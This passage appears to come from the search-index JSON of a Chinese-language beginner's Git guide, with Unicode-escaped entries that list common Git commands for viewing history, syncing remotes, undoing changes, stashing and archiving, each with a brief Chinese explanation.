\u663e\u793a\u4e24\u6b21\u63d0\u4ea4\u4e4b\u95f4\u7684\u5dee\u5f02 $ git diff [ first-branch ] ... [ second-branch ] # \u663e\u793a\u4eca\u5929\u4f60\u5199\u4e86\u591a\u5c11\u884c\u4ee3\u7801 $ git diff --shortstat \"@{0 day ago}\" # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u7684\u5143\u6570\u636e\u548c\u5185\u5bb9\u53d8\u5316 $ git show [ commit ] # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u53d1\u751f\u53d8\u5316\u7684\u6587\u4ef6 $ git show --name-only [ commit ] # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u65f6\uff0c\u67d0\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9 $ git show [ commit ] : [ filename ] # \u663e\u793a\u5f53\u524d\u5206\u652f\u7684\u6700\u8fd1\u51e0\u6b21\u63d0\u4ea4 $ git reflog","title":"\u67e5\u770b\u4fe1\u606f"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_19","text":"# \u4e0b\u8f7d\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6240\u6709\u53d8\u52a8 $ git fetch [ remote ] # \u663e\u793a\u6240\u6709\u8fdc\u7a0b\u4ed3\u5e93 $ git remote -v # \u663e\u793a\u67d0\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u7684\u4fe1\u606f $ git remote show [ remote ] # \u589e\u52a0\u4e00\u4e2a\u65b0\u7684\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5e76\u547d\u540d $ git remote add [ shortname ] [ url ] # \u53d6\u56de\u8fdc\u7a0b\u4ed3\u5e93\u7684\u53d8\u5316\uff0c\u5e76\u4e0e\u672c\u5730\u5206\u652f\u5408\u5e76 $ git pull [ remote ] [ branch ] # \u4e0a\u4f20\u672c\u5730\u6307\u5b9a\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93 $ git push [ remote ] [ branch ] # \u5f3a\u884c\u63a8\u9001\u5f53\u524d\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5373\u4f7f\u6709\u51b2\u7a81 $ git push [ remote ] --force # \u63a8\u9001\u6240\u6709\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93 $ git push [ remote ] --all","title":"\u8fdc\u7a0b\u540c\u6b65"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_20","text":"# \u6062\u590d\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u5de5\u4f5c\u533a $ git checkout [ file ] # \u6062\u590d\u67d0\u4e2acommit\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a $ git checkout [ commit ] [ file ] # \u6062\u590d\u6682\u5b58\u533a\u7684\u6240\u6709\u6587\u4ef6\u5230\u5de5\u4f5c\u533a $ git checkout . # \u91cd\u7f6e\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\uff0c\u4e0e\u4e0a\u4e00\u6b21commit\u4fdd\u6301\u4e00\u81f4\uff0c\u4f46\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset [ file ] # \u91cd\u7f6e\u6682\u5b58\u533a\u4e0e\u5de5\u4f5c\u533a\uff0c\u4e0e\u4e0a\u4e00\u6b21commit\u4fdd\u6301\u4e00\u81f4 $ git reset --hard # \u91cd\u7f6e\u5f53\u524d\u5206\u652f\u7684\u6307\u9488\u4e3a\u6307\u5b9acommit\uff0c\u540c\u65f6\u91cd\u7f6e\u6682\u5b58\u533a\uff0c\u4f46\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset [ commit ] # \u91cd\u7f6e\u5f53\u524d\u5206\u652f\u7684HEAD\u4e3a\u6307\u5b9acommit\uff0c\u540c\u65f6\u91cd\u7f6e\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\uff0c\u4e0e\u6307\u5b9acommit\u4e00\u81f4 $ git reset --hard [ commit ] # \u91cd\u7f6e\u5f53\u524dHEAD\u4e3a\u6307\u5b9acommit\uff0c\u4f46\u4fdd\u6301\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset --keep [ commit ] # \u65b0\u5efa\u4e00\u4e2acommit\uff0c\u7528\u6765\u64a4\u9500\u6307\u5b9acommit # \u540e\u8005\u7684\u6240\u6709\u53d8\u5316\u90fd\u5c06\u88ab\u524d\u8005\u62b5\u6d88\uff0c\u5e76\u4e14\u5e94\u7528\u5230\u5f53\u524d\u5206\u652f $ git revert [ commit ] \u6682\u65f6\u5c06\u672a\u63d0\u4ea4\u7684\u53d8\u5316\u79fb\u9664\uff0c\u7a0d\u540e\u518d\u79fb\u5165 $ git stash $ git stash pop","title":"\u64a4\u9500"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_21","text":"# \u751f\u6210\u4e00\u4e2a\u53ef\u4f9b\u53d1\u5e03\u7684\u538b\u7f29\u5305 $ git archive","title":"\u5176\u4ed6"}]}